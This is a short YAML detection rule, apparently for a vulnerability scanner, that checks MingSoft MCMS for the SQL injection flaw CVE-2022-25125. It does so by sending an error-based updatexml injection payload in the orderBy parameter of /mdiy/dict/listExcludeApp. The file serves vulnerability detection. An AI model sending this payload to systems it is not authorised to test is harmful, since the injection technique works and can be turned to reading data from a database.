name: yaml-poc-mingsoft-mcms-sql_injection-CVE-2022-25125
binding: 116152ab-d25e-4230-b755-dd1c42dfc5ba
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-25125/
        - https://gitee.com/mingSoft/MCMS/issues/I4TGYI
        - https://nvd.nist.gov/vuln/detail/CVE-2022-25125
    vulnerability:
        id: 293707cb-208c-48c5-a6af-725026059788
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /mdiy/dict/listExcludeApp?query=1&dictType=1&orderBy=1/**/or/**/updatexml(1,concat(0x7e,md5({{s1}}),0x7e),1)/**/or/**/1
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0()
